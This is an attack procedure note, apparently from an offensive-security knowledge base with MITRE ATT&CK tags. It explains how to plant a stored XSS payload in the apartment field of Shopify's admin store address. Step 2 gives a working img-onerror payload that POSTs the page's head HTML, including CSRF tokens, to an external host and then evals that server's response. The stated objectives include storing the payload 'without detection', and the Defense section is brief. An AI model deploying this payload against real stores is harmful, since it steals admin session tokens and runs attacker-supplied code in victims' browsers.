---
tags:
  - xss
  - stored-xss
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/shopify-xss-payload-injection]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: a0241b59-fa21-42f7-b798-b0c7fc695906
created_at: '2025-12-14T17:30:18.195Z'
updated_at: '2025-12-14T17:30:18.195Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Store-Address

## Summary

This procedure injects a malicious HTML/JavaScript payload into the 'Apartment, suite, etc. (optional)' field in Shopify's admin store address settings, exploiting lack of sanitization to store XSS for later execution in the Email App.

## Description

The vulnerability stems from insufficient input validation in the store address field. The compact payload uses an invalid <img> src to trigger onerror, employing setTimeout for delayed execution and XMLHttpRequest to exfiltrate document.head.innerHTML via postMessage to an external server. This bypasses the 255-character limit and enables CSRF token theft upon rendering.

## Requirements

1. Access to Shopify admin settings (from prior procedure).
2. External server endpoint (e.g., https://fbs.ninja) to receive data.
3. Browser for manual injection.

## Defense

Defensive measures and detection strategies:

- Sanitize and escape HTML in all stored inputs.
- Use Content Security Policy (CSP) to block inline scripts.
- Log and review admin setting changes.

## Objectives

1. Store malicious payload without detection.
2. Ensure payload survives storage and retrieval.
3. Set up for delayed exfiltration.

## Instructions

### Step 1: Locate the Vulnerable Field

**Context**: Identify the optional apartment field in the address section.

**Command** (Manual Browser Action):

Scroll to Store address > Apartment, suite, etc. (optional).

> Expected output: Text input field appears, ready for entry.

### Step 2: Inject the Payload

**Context**: Enter the XSS payload to trigger on render.

**Command** ([[commands/shopify-xss-payload-injection]]):

```html
<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/> 
```

> Paste into the field and save. Expected output: Settings update without errors; payload stored.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-xss-payload-injection]]

## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[payload-injection]]
